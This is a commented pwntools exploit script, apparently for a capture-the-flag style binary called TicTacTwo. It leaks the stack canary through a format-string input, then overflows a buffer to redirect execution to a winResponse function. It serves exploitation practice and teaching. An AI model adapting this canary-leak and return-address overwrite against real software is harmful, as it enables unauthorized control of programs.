# import the pwntools library
from pwn import *

# launch the binary on a process object
proc = process('./TicTacTwo')

# start creating the payload
payload = b'A' * 14

# interact with the program and send it %11$x as the input
# to get the 11th word (stack canary) from stack
proc.recvline_contains(b'Player')
proc.sendline('%11$x')

# strip the output with the stack canary and add it to the payload
s = str(proc.recvline().split(b'at position ')[1].split(b'?')[0])
s = s[2:-1]
s = int(s, 16).to_bytes(4, byteorder='little')
payload += s 

# add pad bytes to the input to reach EIP
payload += b'B'*12

# add the IP of the winResponse function the payload to replace saved EIP
payload += (0x56556842).to_bytes(4, byteorder='little')

# add padding bytes for the return pointer for winResponse function
payload += b'C'*4

# add the argument that makes the winResponse function write the username to
# the text file
payload += b'X'

# send the payload and interact with the program for it to return from playerInput function
print(payload)
proc.sendline('n')
proc.sendline(payload)
print(proc.recvline())
proc.sendline('y')
print(proc.recvline())
proc.sendline('1')
print(proc.recvline())
proc.sendline('y')
proc.recvline()
